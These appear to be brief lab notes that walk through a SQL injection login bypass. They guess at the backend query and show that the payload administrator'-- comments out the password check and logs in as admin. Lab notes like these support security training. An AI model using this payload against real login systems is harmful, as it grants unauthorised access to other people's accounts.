SQL injection - login functionality

End goal: perform SQLi attack and log in as the administrator

Analysis
--------

Attempt username "admin" password "admin"
"Invalid username or password" (non-verbose / generic error message)

Format of the SQL query in the backend would probably be something like this:
SELECT firstName FROM users WHERE username='admin' and password='admin'

Try a query that displays admin login but ignores the password field
SELECT firstName FROM users WHERE username='admin'--' and password='admin'
SELECT firstName FROM users WHERE username='admin'
Does not work because the user "admin" doesn't exist

Try username "administrator" instead
administrator'--
This works
